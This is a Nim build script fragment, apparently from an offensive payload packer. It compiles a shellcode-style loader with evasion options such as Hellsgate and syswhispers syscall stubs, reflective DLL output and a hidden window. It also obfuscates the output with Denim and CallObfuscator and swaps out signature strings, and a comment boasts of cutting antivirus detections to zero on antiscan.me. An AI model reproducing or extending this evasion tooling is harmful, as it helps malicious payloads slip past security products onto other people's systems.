# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
# --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality

var basicCompileFlags: string = ""

when system.hostOS == "windows":
    if (denim):
        var exist: bool = fileExists("denim.exe")
        if (exist):
            stub = stub.replace("import strenc", "")
            writeFile("Loader.nim", stub)
            discard os.execShellCmd(fmt".\denim.exe compile Loader.nim")
            let msg = fmt"[!] Encrypted file saved to Loader.exe"
            echo "\n" & msg
            if(replace):
                var randstring: string = rndStr(2)
                echo fmt"[!] ---> replacing nim with {randstring} "
                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
            quit()
elif system.hostOS == "linux":
    if (denim):
        echo "No Denim support for Linux systems, sorry!"


when system.hostOS == "windows":
    basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "
elif system.hostOS == "linux":
    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size "


if (compileX86):
    basicCompileFlags.add("--cpu:i386 ")

if (dll_out):
    if (processname == ""):
        basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
    else:
        basicCompileFlags.add("--app=lib -d:lib_only ")
else:
    if(hide):
        basicCompileFlags.add("--app=gui ")
    else:
        basicCompileFlags.add("--app=console ")
    if (reflective):
        basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")

if (hellsgate):
    echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
    discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")
elif(syswhispers != true):
    basicCompileFlags.add("--passc=-flto --passl=-flto ")

# for e.g. CNA Scripts
when system.hostOS == "windows":
    basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
else:
    basicCompileFlags.add(fmt"-p:'{packerPath}' ")

basicCompileFlags.add(fmt"--out={outfile} Loader.nim")


if debugMode:
    basicCompileFlags = basicCompileFlags.replace("-d:release", "")
    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
    basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")


echo "Compile command:"
echo basicCompileFlags
echo "\n\n"
discard os.execShellCmd(basicCompileFlags)

proc replaceList () =
    var words: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = "Dicts\\toReplace.txt"
    else:
        dictionary = "Dicts/toReplace.txt"
    for line in lines dictionary:
      words.add(line)
    var length: int = len(words) - 1
    for i in 0..length:
        var wordLength: int = len(words[i])
        var replacelength = wordLength - 1
        #echo words[i]
        #echo wordLength
        var randstring: string = rndStr(replacelength)
        echo fmt"[!] ---> replacing {words[i]} with {randstring} "
        var command: string = fmt"nimgrep ""{words[i]}"""
        command.add(fmt" --replace {randstring} {outfile}")
        echo command
        discard exec_cmd_ex(command)

if(replace):
    replaceList()
let msg = fmt"[!] Encrypted file saved to {outfile}"
echo "\n" & msg

if (callobfs):
    when system.hostOS == "windows":
        var outfileonlyname = outfile.replace(packerPath, "")
        echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
        echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
        echo "\r\n"
        echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
    else:
        echo "Only usable from a Windows OS, sorry!"